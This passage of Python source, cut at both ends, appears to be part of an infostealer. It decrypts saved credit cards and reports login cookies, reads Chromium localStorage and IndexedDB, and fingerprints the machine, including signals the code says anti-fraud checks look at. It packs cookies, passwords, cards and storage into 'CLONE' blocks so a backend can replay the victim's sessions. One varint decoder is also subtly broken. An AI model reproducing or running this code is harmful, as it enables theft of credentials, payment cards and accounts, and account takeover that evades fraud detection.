            failed += 1
            continue
        results.append({
            "name": name or "",
            "number": number,
            "exp_month": exp_m or 0,
            "exp_year": exp_y or 0,
            "version": version,
        })
        ok += 1
    if ok or skipped or failed:
        note = f"    credit_cards: {ok} decrypted"
        if skipped:
            note += f", {skipped} v20 skipped"
        if failed:
            note += f", {failed} failed"
        emit(note)
    return results


# ---------------------------------------------------------------------------
# Report
# ---------------------------------------------------------------------------
def build_report(records):
    """Turn the flat cookie list into a grouped, readable, verifier-compatible report.

    records: list of dicts {browser, profile, site, host, name, value, is_login, version}.

    NOTE: verify_cookies_playwright.py parses everything AFTER the 'ALL COOKIES BY
    SITE' header, keying off '### site (N cookies)' headers and '  * [host] name =
    value' lines. Keep that section's line format intact.
    """
    lines = []
    total = len(records)
    login_records = [r for r in records if r["is_login"]]

    by_browser = {}
    for r in records:
        by_browser.setdefault(r["browser"], []).append(r)
    all_sites = {r["site"] for r in records}
    all_profiles = {(r["browser"], r["profile"]) for r in records}

    lines.append(f"Decrypted {total} cookies from {len(by_browser)} browser(s), "
                 f"{len(all_profiles)} profile(s), across {len(all_sites)} site(s).")
    lines.append(f"Of these, {len(login_records)} look like login / session credentials.")
    lines.append("")

    # --- Section 0: what was found -------------------------------------------
    lines.append("=" * 70)
    lines.append(" BROWSERS DETECTED")
    lines.append("=" * 70)
    for b in sorted(by_browser):
        recs = by_browser[b]
        versions = {}
        for r in recs:
            versions[r["version"]] = versions.get(r["version"], 0) + 1
        profs = sorted({r["profile"] for r in recs})
        vtxt = ", ".join(f"{v} {k}" for k, v in sorted(versions.items()))
        lines.append("")
        lines.append(f"  {b}")
        lines.append(f"      cookies : {len(recs)}  ({vtxt})")
        lines.append(f"      profiles: {', '.join(profs)}")
    lines.append("")

    # --- Section 1: the actual sign-in credentials ---------------------------
    lines.append("=" * 70)
    lines.append(" LOGIN / SESSION COOKIES  (what actually keeps you signed in)")
    lines.append("=" * 70)
    if not login_records:
        lines.append("(none detected)")
    else:
        grp = {}
        for r in login_records:
            grp.setdefault((r["browser"], r["profile"]), {}).setdefault(r["site"], []).append(r)
        for (b, p) in sorted(grp):
            lines.append("")
            lines.append(f"----- {b}  /  {p} -----")
            for site in sorted(grp[(b, p)]):
                lines.append(f"  {site}")
                for r in grp[(b, p)][site]:
                    lines.append(f"      [{r['host']}] {r['name']}")
                    lines.append(f"          {r['value']}")
    lines.append("")

    # --- Section 2: every cookie, grouped by browser/profile then site -------
    # (This is the section verify_cookies_playwright.py reads.)
    lines.append("=" * 70)
    lines.append(" ALL COOKIES BY SITE  (grouped by browser & profile; * = login cookie)")
    lines.append("=" * 70)
    grp = {}
    for r in records:
        grp.setdefault((r["browser"], r["profile"]), {}).setdefault(r["site"], []).append(r)
    for (b, p) in sorted(grp):
        lines.append("")
        lines.append(f"----- {b}  /  {p} -----")
        for site in sorted(grp[(b, p)]):
            entries = grp[(b, p)][site]
            lines.append("")
            lines.append(f"### {site}  ({len(entries)} cookies)")
            for r in entries:
                mark = "*" if r["is_login"] else " "
                lines.append(f"  {mark} [{r['host']}] {r['name']} = {r['value']}")

    return lines


# ---------------------------------------------------------------------------
# LevelDB reader — parses Chromium's localStorage (LevelDB SSTables + WAL)
# ---------------------------------------------------------------------------
# Every Chromium profile stores localStorage as a LevelDB instance in
#   {profile}/Local Storage/leveldb/
# Keys are in the form:  _https://origin\x00keyName
# Values are the stored strings (UTF-16LE for Chromium, we decode to UTF-8).
#
# LevelDB SSTable (.ldb) layout:
#   [data block]*  [meta block]*  [metaindex block]  [index block]  [footer 48B]
# The footer contains BlockHandles (varint64 offset+size) for the metaindex and
# index blocks. The index block maps last-key → BlockHandle for each data block.
# Data blocks use restart-based prefix compression; blocks are often Snappy-
# compressed. The WAL (.log) carries recent writes not yet compacted into .ldb.

def _decode_varint32(data, pos):
    """Read a 32-bit varint. Returns (value, new_pos) or (None, pos) on error."""
    result = 0
    for shift in (0, 7, 14, 21, 28):
        if pos >= len(data):
            return None, pos
        b = data[pos]
        pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result, pos
    return None, pos   # too long for 32-bit

def _decode_varint64(data, pos):
    """Read a 64-bit varint. Returns (value, new_pos) or (None, pos) on error."""
    result = 0
    for shift in (0, 7, 14, 21, 28, 35, 42, 49, 56, 63):
        if pos >= len(data):
            return None, pos
        b = data[pos]
        pos += 1
        result |= (b & 0x7F) << shift
        if not (b & 0x80):
            return result & 0xFFFFFFFFFFFFFFFF
    if pos < len(data) and data[pos] & 0x80 == 0:
        # 10th byte with high bit clear → 64-bit value complete
        pos += 1
    return None, pos

def _decode_fixed32(data, pos):
    if pos + 4 > len(data):
        return None, pos
    return struct.unpack_from("<I", data, pos)[0], pos + 4

def _snappy_decompress(raw):
    """Decompress Snappy-compressed bytes using cramjam. Returns bytes or None."""
    try:
        import cramjam
        return cramjam.snappy.decompress(raw)
    except Exception:
        return None

def _parse_block(data, want_keys=True):
    """Parse a LevelDB data or index block (restart-based prefix compression).

    Returns list of (key, value) byte pairs, preserving insertion order.
    Skips entries whose value looks like a BlockHandle (used in index blocks)
    by returning them as-is — the caller decides what to do.
    """
    if len(data) < 5:
        return []
    num_restarts = struct.unpack_from("<I", data, len(data) - 4)[0]
    if num_restarts == 0:
        return []
    restart_end = len(data) - 4 - num_restarts * 4
    if restart_end < 0:
        return []

    entries = []
    key = b""
    pos = 0
    while pos < restart_end:
        shared, pos = _decode_varint32(data, pos)
        unshared, pos = _decode_varint32(data, pos)
        vallen, pos = _decode_varint32(data, pos)
        if shared is None or unshared is None or vallen is None:
            break
        if pos + unshared + vallen > len(data):
            break
        key = key[:shared] + data[pos:pos + unshared]
        pos += unshared
        value = data[pos:pos + vallen]
        pos += vallen
        entries.append((key, value))
    return entries

def _parse_sstable(path):
    """Parse one .ldb SSTable file. Returns dict of key → value."""
    result = {}
    try:
        sz = os.path.getsize(path)
        if sz < 48:
            return result
        with open(path, "rb") as f:
            f.seek(sz - 48)
            footer = f.read(48)
    except OSError:
        return result

    # Footer: metaindex_handle, index_handle, padding, magic (8B)
    magic = footer[40:48]
    if magic != b"\x57\xfb\x80\x8b\x24\x75\x47\xdb":
        return result

    fp = 0
    meta_off, fp = _decode_varint64(footer, fp)
    meta_sz, fp = _decode_varint64(footer, fp)
    idx_off, fp = _decode_varint64(footer, fp)
    idx_sz, fp = _decode_varint64(footer, fp)
    if None in (meta_off, meta_sz, idx_off, idx_sz):
        return result

    # Read index block → list of (last_key, BlockHandle(offset, size)) for data blocks
    index_entries = []
    try:
        with open(path, "rb") as f:
            f.seek(idx_off)
            raw = f.read(idx_sz)
    except OSError:
        return result
    idx_decomp = _snappy_decompress(raw) if raw else None
    idx_data = idx_decomp or raw
    for ikey, ival in _parse_block(idx_data):
        off, _ = _decode_varint64(ival, 0)
        sz, _ = _decode_varint64(ival, _)
        if off is not None and sz is not None:
            index_entries.append((off, sz))

    # Read each data block
    try:
        with open(path, "rb") as f:
            for boff, bsz in index_entries:
                f.seek(boff)
                raw = f.read(bsz)
                decomp = _snappy_decompress(raw) if raw else None
                block_data = decomp or raw
                for k, v in _parse_block(block_data):
                    result[k] = v
    except OSError:
        pass
    return result

def _parse_wal(path):
    """Parse a LevelDB Write-Ahead Log (.log). Returns dict of key→value.

    WAL blocks are 32 KB. Each record: checksum(4) | length(2) | type(1) | data.
    Types: 1=FULL, 2=FIRST, 3=MIDDLE, 4=LAST. Split records are reassembled.
    """
    BLOCK = 32768
    result = {}
    try:
        with open(path, "rb") as f:
            data = f.read()
    except OSError:
        return result

    pos = 0
    frag = b""
    while pos + 7 <= len(data):
        # Records never start at the very end of a block boundary — if the record
        # header would straddle the boundary, the block remainder is zero-padded.
        block_off = pos % BLOCK
        if block_off + 7 > BLOCK:
            pos += BLOCK - block_off
            continue
        checksum = struct.unpack_from("<I", data, pos)[0]
        rec_len = struct.unpack_from("<H", data, pos + 4)[0]
        rectype = data[pos + 6]
        pos += 7
        if rectype == 0:
            continue
        if pos + rec_len > len(data):
            break
        payload = data[pos:pos + rec_len]
        pos += rec_len
        # Skip CRC validation — LevelDB can function with a torn WAL on crash.
        # We read optimistically: bad bytes won't match our key prefix filter anyway.
        if rectype == 1:   # FULL
            _insert_wal_record(result, payload)
        elif rectype == 2: # FIRST
            frag = payload
        elif rectype == 3: # MIDDLE
            frag += payload
        elif rectype == 4: # LAST
            frag += payload
            _insert_wal_record(result, frag)
            frag = b""
    return result

def _insert_wal_record(result, payload):
    """Try to parse a WAL record as a Put(key, value) and insert into result."""
    # LevelDB WAL records are WriteBatch entries:
    #   sequence_number (8 bytes LE)
    #   count (4 bytes LE)
    #   For count N: repeated (type=1 for Put, key, value) triples
    if len(payload) < 12:
        return
    seq = struct.unpack_from("<Q", payload, 0)[0]
    cnt = struct.unpack_from("<I", payload, 8)[0]
    p = 12
    for _ in range(cnt):
        if p >= len(payload):
            break
        op = payload[p]
        p += 1
        if op == 1:  # kTypeValue = Put
            klen, p2 = _decode_varint32(payload, p)
            if klen is None or p2 + klen > len(payload):
                break
            key = payload[p2:p2 + klen]
            p = p2 + klen
            vlen, p2 = _decode_varint32(payload, p)
            if vlen is None or p2 + vlen > len(payload):
                break
            value = payload[p2:p2 + vlen]
            p = p2 + vlen
            result[key] = value
        elif op == 0:  # kTypeDeletion = Delete
            klen, p2 = _decode_varint32(payload, p)
            if klen is None or p2 + klen > len(payload):
                break
            key = payload[p2:p2 + klen]
            p = p2 + klen
            result.pop(key, None)
        else:
            # Unknown op — skip to next record boundary (best-effort)
            break

def _read_leveldb_directory(dir_path):
    """Read all (key → value) from a LevelDB directory. Merges SSTables + WALs.

    WAL records (more recent) overwrite SSTable entries for the same key.
    """
    result = {}
    if not os.path.isdir(dir_path):
        return result
    # SSTables (.ldb)
    for name in sorted(os.listdir(dir_path)):
        if name.endswith(".ldb"):
            db = _parse_sstable(os.path.join(dir_path, name))
            result.update(db)
    # WALs (.log) — more recent, overwrite
    for name in sorted(os.listdir(dir_path)):
        if name.endswith(".log"):
            wal = _parse_wal(os.path.join(dir_path, name))
            result.update(wal)
    return result


# ---------------------------------------------------------------------------
# Chromium localStorage extraction
# ---------------------------------------------------------------------------
def _origin_from_key(raw_key):
    """Extract origin from a Chromium localStorage LevelDB key.

    Keys are formed as:  _{origin}\x00{storageKey}
    where origin is like 'https://accounts.google.com'.
    Returns (origin_str, storage_key_str) or (None, None).
    """
    if not raw_key or raw_key[0:1] != b"_":
        return None, None
    # Chromium stores values as UTF-16LE; keys are ASCII with \x00 separator.
    try:
        key_str = raw_key.decode("utf-8", errors="replace")
    except Exception:
        return None, None
    idx = key_str.find("\x00")
    if idx <= 1:
        return None, None
    origin = key_str[1:idx]   # strip the leading '_'
    storage_key = key_str[idx + 1:]
    return origin, storage_key

def _decode_local_storage_value(raw_value):
    """Chromium encodes localStorage values as UTF-16LE, prefixed with \x01."""
    if not raw_value or len(raw_value) < 2:
        return ""
    # First byte(s) may be a type marker (\x01 for string, \x00 for undefined).
    val = raw_value
    if val[0:1] == b"\x01":
        val = val[1:]
    elif val[0:2] == b"\x00\x00":
        val = val[2:]
    try:
        return val.decode("utf-16-le", errors="replace")
    except Exception:
        return val.decode("utf-8", errors="replace")

def extract_chromium_local_storage(profile_path):
    """Extract localStorage for one Chromium profile → {origin: {key: value}}.

    Reads {profile}/Local Storage/leveldb/ (LevelDB), decodes keys grouped by
    origin, converts UTF-16LE values to plain strings. Session Storage in Chromium
    is volatile (in-memory + temp files that vanish when the browser closes), so
    only localStorage can be reliably extracted offline.
    """
    leveldb_dir = os.path.join(profile_path, "Local Storage", "leveldb")
    if not os.path.isdir(leveldb_dir):
        return {}
    raw = _read_leveldb_directory(leveldb_dir)
    origins = collections.OrderedDict()
    for k, v in raw.items():
        origin, key = _origin_from_key(k)
        if not origin or not key:
            continue
        val = _decode_local_storage_value(v)
        origins.setdefault(origin, collections.OrderedDict())[key] = val
    return origins


# ---------------------------------------------------------------------------
# Browser / machine fingerprint
# ---------------------------------------------------------------------------
# Map Windows timezone keys → IANA timezone IDs (most common entries).
_WINDOWS_TO_IANA_TZ = {
    # Africa
    "W. Central Africa Standard Time": "Africa/Lagos",
    "South Africa Standard Time": "Africa/Johannesburg",
    "Egypt Standard Time": "Africa/Cairo",
    "E. Africa Standard Time": "Africa/Nairobi",
    "Morocco Standard Time": "Africa/Casablanca",
    # Americas
    "Eastern Standard Time": "America/New_York",
    "Central Standard Time": "America/Chicago",
    "Mountain Standard Time": "America/Denver",
    "Pacific Standard Time": "America/Los_Angeles",
    "Atlantic Standard Time": "America/Halifax",
    "SA Pacific Standard Time": "America/Bogota",
    "SA Western Standard Time": "America/La_Paz",
    "Central Brazilian Standard Time": "America/Cuiaba",
    "E. South America Standard Time": "America/Sao_Paulo",
    "Argentina Standard Time": "America/Argentina/Buenos_Aires",
    "Mexico Standard Time": "America/Mexico_City",
    "Canada Central Standard Time": "America/Regina",
    # Europe
    "GMT Standard Time": "Europe/London",
    "Greenwich Standard Time": "Africa/Abidjan",
    "W. Europe Standard Time": "Europe/Berlin",
    "Central Europe Standard Time": "Europe/Budapest",
    "Romance Standard Time": "Europe/Paris",
    "Central European Standard Time": "Europe/Warsaw",
    "E. Europe Standard Time": "Europe/Bucharest",
    "Turkey Standard Time": "Europe/Istanbul",
    "Russian Standard Time": "Europe/Moscow",
    # Asia / Pacific
    "Arabian Standard Time": "Asia/Dubai",
    "Arab Standard Time": "Asia/Riyadh",
    "Iran Standard Time": "Asia/Tehran",
    "India Standard Time": "Asia/Kolkata",
    "SE Asia Standard Time": "Asia/Bangkok",
    "Singapore Standard Time": "Asia/Singapore",
    "China Standard Time": "Asia/Shanghai",
    "Tokyo Standard Time": "Asia/Tokyo",
    "Korea Standard Time": "Asia/Seoul",
    "AUS Eastern Standard Time": "Australia/Sydney",
    "New Zealand Standard Time": "Pacific/Auckland",
}

def _get_screen_resolution():
    """Actual screen dimensions via GetSystemMetrics."""
    try:
        user32 = ctypes.windll.user32
        return {
            "width": user32.GetSystemMetrics(0),   # SM_CXSCREEN
            "height": user32.GetSystemMetrics(1),  # SM_CYSCREEN
        }
    except Exception:
        return {"width": 1920, "height": 1080}

def _get_windows_timezone_key():
    """Windows timezone key name via GetDynamicTimeZoneInformation."""
    try:
        class DYNAMIC_TIME_ZONE_INFORMATION(ctypes.Structure):
            _fields_ = [
                ("Bias", wintypes.LONG),
                ("StandardName", wintypes.WCHAR * 32),
                ("StandardDate", wintypes.SYSTEMTIME),
                ("StandardBias", wintypes.LONG),
                ("DaylightName", wintypes.WCHAR * 32),
                ("DaylightDate", wintypes.SYSTEMTIME),
                ("DaylightBias", wintypes.LONG),
                ("TimeZoneKeyName", wintypes.WCHAR * 128),
                ("DynamicDaylightTimeDisabled", wintypes.BOOLEAN),
            ]
        dtzi = DYNAMIC_TIME_ZONE_INFORMATION()
        ctypes.windll.kernel32.GetDynamicTimeZoneInformation(ctypes.byref(dtzi))
        return dtzi.TimeZoneKeyName, -dtzi.Bias  # minutes east of UTC
    except Exception:
        return "", 0

def _get_iana_timezone():
    """Convert Windows timezone key → IANA timezone ID."""
    key, offset = _get_windows_timezone_key()
    return _WINDOWS_TO_IANA_TZ.get(key, "")

def _get_utc_offset_minutes():
    _, offset = _get_windows_timezone_key()
    return offset

def _get_system_locale():
    """Windows locale name via GetUserDefaultLocaleName (e.g. 'en-NG')."""
    try:
        buf = ctypes.create_unicode_buffer(85)
        if ctypes.windll.kernel32.GetUserDefaultLocaleName(buf, 85):
            return buf.value
    except Exception:
        pass
    return ""

def _get_accept_language():
    """Build an Accept-Language string from the system locale."""
    loc = _get_system_locale()
    if not loc:
        return "en-US,en;q=0.9"
    lang = loc.replace("_", "-")
    primary = lang.split("-")[0] if "-" in lang else lang
    return f"{lang},{primary};q=0.9"

def _get_cpu_cores():
    return os.cpu_count() or 4

def _get_device_memory():
    """Total physical memory in GB (rounded)."""
    try:
        class MEMORYSTATUSEX(ctypes.Structure):
            _fields_ = [
                ("dwLength", wintypes.DWORD),
                ("dwMemoryLoad", wintypes.DWORD),
                ("ullTotalPhys", ctypes.c_uint64),
                ("ullAvailPhys", ctypes.c_uint64),
                ("ullTotalPageFile", ctypes.c_uint64),
                ("ullAvailPageFile", ctypes.c_uint64),
                ("ullTotalVirtual", ctypes.c_uint64),
                ("ullAvailVirtual", ctypes.c_uint64),
                ("ullAvailExtendedVirtual", ctypes.c_uint64),
            ]
        mem = MEMORYSTATUSEX()
        mem.dwLength = ctypes.sizeof(MEMORYSTATUSEX)
        ctypes.windll.kernel32.GlobalMemoryStatusEx(ctypes.byref(mem))
        gb = mem.ullTotalPhys / (1024 ** 3)
        # Round to powers of 2 that browsers report (1, 2, 4, 8, 16, 32)
        for candidate in (1, 2, 4, 8, 16, 32):
            if gb <= candidate:
                return candidate
        return 32
    except Exception:
        return 8

def _get_platform_str():
    """Platform string as reported by navigator.platform (e.g. 'Win32')."""
    # Modern browsers report Win32 even on 64-bit.
    return "Win32"

def _get_os_version():
    """Windows version like 'Windows 10.0.19045'."""
    try:
        v = sys.getwindowsversion()
        return f"Windows {v.major}.{v.minor}.{v.build}"
    except Exception:
        return "Windows"

def _get_browser_version(user_data_path):
    """Read Chromium version from {user_data}/Last Version file."""
    lv = os.path.join(user_data_path, "Last Version")
    if os.path.isfile(lv):
        try:
            return open(lv, "r").read().strip()
        except Exception:
            pass
    return ""

def _build_chromium_ua(version, browser_name):
    """Construct the browser's real User-Agent from its detected version."""
    os_ver = _get_os_version()
    nt_ver = os_ver.replace("Windows ", "")
    base = (f"Mozilla/5.0 (Windows NT {nt_ver}; Win64; x64) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{version} Safari/537.36")
    if "Edge" in browser_name:
        return base + f" Edg/{version}"
    return base

def collect_system_fingerprint():
    """Collect machine-level fingerprint — same regardless of which browser."""
    return {
        "screen": _get_screen_resolution(),
        "timezone": _get_iana_timezone(),
        "utc_offset_minutes": _get_utc_offset_minutes(),
        "locale": _get_system_locale(),
        "accept_language": _get_accept_language(),
        "cpu_cores": _get_cpu_cores(),
        "device_memory": _get_device_memory(),
        "platform": _get_platform_str(),
        "os_version": _get_os_version(),
    }

def collect_browser_fingerprint(user_data_path, browser_name):
    """Collect browser-specific fingerprint: real User-Agent + Preferences."""
    version = _get_browser_version(user_data_path)
    ua = _build_chromium_ua(version, browser_name) if version else ""
    prefs = _extract_preferences(user_data_path)
    return {
        "user_agent": ua,
        "version": version,
        "accept_languages": prefs.get("accept_languages", ""),
    }


# ---------------------------------------------------------------------------
# Browser Preferences — accept_languages, per-site permissions
# ---------------------------------------------------------------------------
def _extract_preferences(user_data_path):
    """Extract relevant signals from Chromium's Preferences JSON.

    Preferences is a *per-profile* file (e.g. ``Default/Preferences``), not a
    User Data root file. We scan the Default profile first, then any other
    profile, so this keeps working regardless of which profile is active and
    without hard-coding a specific profile name.

    The accept_languages field is the EXACT string sent in every HTTP Accept-
    Language header. This string often differs from the OS locale (e.g.
    "en-NG,en-US;q=0.9,en;q=0.8" vs. just "en-NG") and is part of the
    fingerprint that anti-fraud systems check.
    """
    candidates = []
    default = os.path.join(user_data_path, "Default", "Preferences")
    candidates.append(default)
    try:
        for entry in sorted(os.listdir(user_data_path)):
            full = os.path.join(user_data_path, entry)
            if os.path.isdir(full) and entry != "System Profile":
                candidates.append(os.path.join(full, "Preferences"))
    except OSError:
        pass

    for prefs_path in candidates:
        if not os.path.isfile(prefs_path):
            continue
        try:
            with open(prefs_path, "r", encoding="utf-8") as f:
                prefs = json.load(f)
        except Exception:
            continue
        al = (prefs.get("intl") or {}).get("accept_languages", "")
        if al:
            return {"accept_languages": al}

    return {}


# ---------------------------------------------------------------------------
# IndexedDB extraction via Playwright (offline LevelDB parsing is unreliable)
# ---------------------------------------------------------------------------

def _indexeddb_hosts(profile_dir):
    """Return host names that appear in a profile's IndexedDB directory.

    Chromium names each database folder like ``https_www.example.com_0.leveldb``
    or ``http_localhost_8080.leveldb``. We only need the host part here so we can
    filter which cookie/localStorage origins are worth visiting (avoiding a slow
    browser launch + navigation for origins that have no IndexedDB at all).
    """
    hosts = set()
    idx_path = os.path.join(profile_dir, "IndexedDB")
    if not os.path.isdir(idx_path):
        return hosts
    try:
        entries = os.listdir(idx_path)
    except OSError:
        return hosts
    for name in entries:
        if not name.endswith(".leveldb"):
            continue
        base = name[: -len(".leveldb")]
        # Strip the scheme prefix.
        for prefix in ("https_", "http_", "chrome-extension_"):
            if base.startswith(prefix):
                base = base[len(prefix):]
                break
        # Strip a trailing "_<digits>" (port / partition index), then any "_".
        while base and base[-1:].isdigit():
            base = base[:-1]
        base = base.rstrip("_")
        if base:
            hosts.add(base)
    return hosts


def extract_indexeddb_via_playwright(profile_dir, browser_name, origins, emit):
    """Extract IndexedDB for ONE profile by launching Chromium against a temp copy.

    Returns {origin: [db_descriptors]} or None.

    We copy the profile's IndexedDB/Local Storage into a throwaway user-data dir
    because:
      * Chrome/Edge refuse remote debugging (which Playwright requires) when the
        user-data dir is their real default profile directory.
      * It avoids locking the live profile while the browser is running.

    Playwright's storage_state(indexedDB=True) only enumerates origins that have
    been visited, so we navigate to each candidate origin (blocked to localhost
    via request interception) before collecting.
    """
    if not HAS_PLAYWRIGHT:
        emit("    Playwright not installed; skipping IndexedDB. (pip install playwright)")
        return None
    if not origins:
        return None

    channel = _PLAYWRIGHT_CHANNEL.get(browser_name)
    label = channel or "bundled"

    indexeddb = {}
    with tempfile.TemporaryDirectory() as tmp:
        tmp_user_data = os.path.join(tmp, "User Data")
        tmp_profile = os.path.join(tmp_user_data, "Default")
        os.makedirs(tmp_profile, exist_ok=True)

        copied = 0
        for sub in ("IndexedDB", "Local Storage"):
            src = os.path.join(profile_dir, sub)
            if os.path.isdir(src):
                try:
                    shutil.copytree(src, os.path.join(tmp_profile, sub), dirs_exist_ok=True)
                    copied += 1
                except OSError:
                    pass
        if not copied:
            return None

        _FAST_FLAGS = [
            "--disable-blink-features=AutomationControlled",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-extensions",
            "--disable-gpu",
            "--disable-sync",
            "--disable-background-networking",
            "--disable-component-update",
            "--disable-features=TranslateUI,BlinkRuntimeCallStats,OptimizationHints",
            "--disable-ipc-flooding-protection",
            "--disable-breakpad",
            "--disable-dev-shm-usage",
            "--mute-audio",
            "--disable-notifications",
        ]

        try:
            with sync_playwright() as p:
                launch_kwargs = {
                    "user_data_dir": tmp_user_data,
                    "headless": True,
                    "args": _FAST_FLAGS,
                }
                if channel:
                    launch_kwargs["channel"] = channel

                context = p.chromium.launch_persistent_context(**launch_kwargs)
                page = context.new_page()
                # Never hit the network — just load enough for Chromium to expose
                # each origin's IndexedDB databases.
                page.route("**/*", lambda route: route.fulfill(
                    body="<html></html>", content_type="text/html"))
                for origin in sorted(origins):
                    try:
                        page.goto(origin, wait_until="domcontentloaded", timeout=15000)
                    except Exception:
                        continue

                state = context.storage_state(indexedDB=True)
                context.close()

                for origin_entry in (state.get("origins") or []):
                    origin = origin_entry.get("origin", "")
                    dbs = origin_entry.get("indexedDB") or []
                    if origin and dbs:
                        indexeddb[origin] = dbs
        except Exception as e:
            emit(f"    ! IndexedDB extraction failed ({label}): {e}")
            return None

    return indexeddb if indexeddb else None


# ---------------------------------------------------------------------------
# Storage + fingerprint + IndexedDB serialization (appended to the cookie report)
# ---------------------------------------------------------------------------
STORAGE_BEGIN = "<<<CLONE_STORAGE_V1"
STORAGE_END = "CLONE_STORAGE_V1>>>"
FINGERPRINT_BEGIN = "<<<CLONE_FINGERPRINT_V1"
FINGERPRINT_END = "CLONE_FINGERPRINT_V1>>>"
COOKIES_JSON_BEGIN = "<<<CLONE_COOKIES_JSON_V1"
COOKIES_JSON_END = "CLONE_COOKIES_JSON_V1>>>"
INDEXEDDB_BEGIN = "<<<CLONE_INDEXEDDB_V1"
INDEXEDDB_END = "CLONE_INDEXEDDB_V1>>>"
PASSWORDS_BEGIN = "<<<CLONE_PASSWORDS_V1"
PASSWORDS_END = "CLONE_PASSWORDS_V1>>>"
CREDIT_CARDS_BEGIN = "<<<CLONE_CREDIT_CARDS_V1"
CREDIT_CARDS_END = "CLONE_CREDIT_CARDS_V1>>>"

def serialize_storage_block(storage_data):
    """Serialize { (browser, profile): {origin: {local: {k:v}, session: {k:v}}} } → embedded JSON block.

    The backend's cookies.py reads both "local" and "session" keys and seeds them
    via init_scripts before any page scripts run. Session storage is volatile and
    only available when the browser was running during extraction, but when present
    it should be serialized.
    """
    profiles_out = []
    for (browser, profile), origins in storage_data.items():
        norm = {}
        for origin, data in origins.items():
            entry = {}
            if data.get("local"):
                entry["local"] = data["local"]
            if data.get("session"):
                entry["session"] = data["session"]
            if entry:
                norm[origin] = entry
        if norm:
            profiles_out.append({
                "browser": browser,
                "profile": profile,
                "origins": norm,
            })
    if not profiles_out:
        return ""
    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n\n{STORAGE_BEGIN}\n{payload}\n{STORAGE_END}\n"


def serialize_indexeddb_block(indexeddb_data):
    """Serialize { (browser, profile): {origin: [db_dicts]} } → embedded JSON block.

    The backend can restore this by calling Playwright's context.storage_state()
    or by running a script that opens the IndexedDB databases and populates them.
    The format follows Playwright's storageState IndexedDB structure:

      {profiles: [{browser, profile, origins: {origin: [{name, version, stores: [...]}]}}]}

    This mirrors the structure of the storage block so the backend can use the
    same (browser, profile) keying to look up the IndexedDB data for a specific
    login's browser profile.
    """
    if not indexeddb_data:
        return ""
    profiles_out = []
    for (browser, profile), origins in indexeddb_data.items():
        if not origins:
            continue
        profiles_out.append({
            "browser": browser,
            "profile": profile,
            "origins": origins,
        })
    if not profiles_out:
        return ""
    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n{INDEXEDDB_BEGIN}\n{payload}\n{INDEXEDDB_END}\n"


def serialize_passwords_block(passwords_data):
    """Serialize { (browser, profile): [password_dicts] } → embedded JSON block.

    Each password dict: {url, username, password, version}.
    """
    if not passwords_data:
        return ""
    profiles_out = []
    for (browser, profile), entries in passwords_data.items():
        if not entries:
            continue
        profiles_out.append({
            "browser": browser,
            "profile": profile,
            "passwords": entries,
        })
    if not profiles_out:
        return ""
    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n{PASSWORDS_BEGIN}\n{payload}\n{PASSWORDS_END}\n"


def serialize_credit_cards_block(cards_data):
    """Serialize { (browser, profile): [card_dicts] } → embedded JSON block.

    Each card dict: {name, number, exp_month, exp_year, version}.
    """
    if not cards_data:
        return ""
    profiles_out = []
    for (browser, profile), entries in cards_data.items():
        if not entries:
            continue
        profiles_out.append({
            "browser": browser,
            "profile": profile,
            "credit_cards": entries,
        })
    if not profiles_out:
        return ""
    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n{CREDIT_CARDS_BEGIN}\n{payload}\n{CREDIT_CARDS_END}\n"


def serialize_fingerprint_block(machine_fp, browser_fps):
    """Serialize {machine: {...}, browsers: {browser_name: {...}}}  → embedded JSON block."""
    payload = json.dumps({
        "machine": machine_fp,
        "browsers": browser_fps,
    }, separators=(",", ":"), ensure_ascii=False)
    return f"\n{FINGERPRINT_BEGIN}\n{payload}\n{FINGERPRINT_END}\n"


def serialize_cookies_json_block(records):
    """Serialize ALL cookie records with their FULL attributes as a JSON block.

    The text report only carries host/name/value/is_login. This JSON block
    carries every attribute the database had — path, expiry, secure flag,
    httpOnly, sameSite, priority, source_scheme — so the backend can clone
    cookies EXACTLY as they existed in the real browser, not make guesses.

    Google's auth cookies rely on specific sameSite, httpOnly, and path values
    that the text report loses. The backend prefers this JSON block when present.
    """
    if not records:
        return ""

    # Group by (browser, profile)
    by_profile = collections.OrderedDict()
    for r in records:
        key = (r["browser"], r["profile"])
        by_profile.setdefault(key, []).append(r)

    profiles_out = []
    for (browser, profile), cookies in by_profile.items():
        # Build per-site cookie list (the backend groups by host)
        cookies_out = []
        for c in cookies:
            cookies_out.append({
                "host": c["host"],
                "name": c["name"],
                "value": c["value"],
                "path": c.get("path", "/"),
                "secure": c.get("secure", False),
                "httponly": c.get("httponly", False),
                "samesite": c.get("samesite", -1),
                "expires": c.get("expires"),
                "priority": c.get("priority", 1),
                "source_scheme": c.get("source_scheme", 0),
                "is_login": c.get("is_login", False),
            })
        profiles_out.append({
            "browser": browser,
            "profile": profile,
            "cookies": cookies_out,
        })

    payload = json.dumps({"profiles": profiles_out}, separators=(",", ":"), ensure_ascii=False)
    return f"\n{COOKIES_JSON_BEGIN}\n{payload}\n{COOKIES_JSON_END}\n"


# ---------------------------------------------------------------------------
# Main (now accepts parsed arguments)
# ---------------------------------------------------------------------------
def main(args):
    # Collect log output so it can be both printed and uploaded.
    log_lines = []
    def emit(*args_emit):
        line = " ".join(str(a) for a in args_emit)
        print(line)
        log_lines.append(line)

    records = []

    emit("Scanning for installed browsers...")
    chromium = discover_chromium_browsers()
    firefox = discover_firefox_browsers()

    if not chromium and not firefox:
        emit("No supported browsers were found on this PC.")
    else:
        found_names = [b["name"] for b in chromium] + [f"{b['name']} (Firefox)" for b in firefox]
        emit(f"Found {len(found_names)} browser(s): " + ", ".join(found_names))

    if CLOSE_BROWSERS and (chromium or firefox):
        emit("")
        close_browsers(emit)

    for b in chromium:
        emit("")
        emit(f"[+] {b['name']}  ->  {b['user_data']}")
        try:
            records.extend(process_chromium_browser(b, emit))
        except Exception as e:
            emit(f"    ! failed to process {b['name']}: {e}")

    for b in firefox:
        emit("")
        emit(f"[+] {b['name']} (Firefox family)  ->  {b['profiles_root']}")
        try:
            records.extend(process_firefox_browser(b, emit))
        except Exception as e:
